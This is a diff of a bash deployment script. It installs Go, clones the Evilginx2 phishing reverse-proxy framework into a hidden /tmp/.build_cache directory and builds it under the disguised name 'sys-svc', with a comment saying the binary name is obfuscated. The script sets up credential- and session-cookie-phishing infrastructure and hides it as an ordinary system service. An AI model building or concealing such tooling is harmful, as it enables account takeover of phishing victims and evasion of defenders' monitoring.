@@ -224,13 +224,12 @@ phase_dependencies() {
     apt-get install -y git curl wget build-essential golang-go openssl jq \
         dnsutils python3 python3-requests expect >/dev/null
     
-    if ! command -v go &>/dev/null; then
-        wget -q https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
-        rm -rf /usr/local/go
-        tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
-        export PATH=$PATH:/usr/local/go/bin
-        rm go1.22.0.linux-amd64.tar.gz
-    fi
+    info "Installing Go 1.22.0 (Required for Evilginx 3.0+)..."
+    wget -q https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
+    rm -rf /usr/local/go
+    tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
+    export PATH=$PATH:/usr/local/go/bin
+    rm -f go1.22.0.linux-amd64.tar.gz
     
     success "Dependencies installed"
 }
@@ -242,11 +241,12 @@ phase_build() {
     log "Building core service..."
     
     rm -rf /tmp/.build_cache
-    cd /tmp
-    git clone https://github.com/kgretzky/evilginx.git .build_cache
-    cd .build_cache
+    # FIXED: Cloning the correct repository (evilginx2 contains v3)
+    git clone https://github.com/kgretzky/evilginx2.git /tmp/.build_cache
+    cd /tmp/.build_cache
+    
     # Obfuscate the binary name during build
-    go build -buildvcs=false -o sys-svc 
+    /usr/local/go/bin/go build -o sys-svc 
     
     if [[ ! -f "sys-svc" ]]; then
         error "Build failed - sys-svc binary not found in $(pwd)"
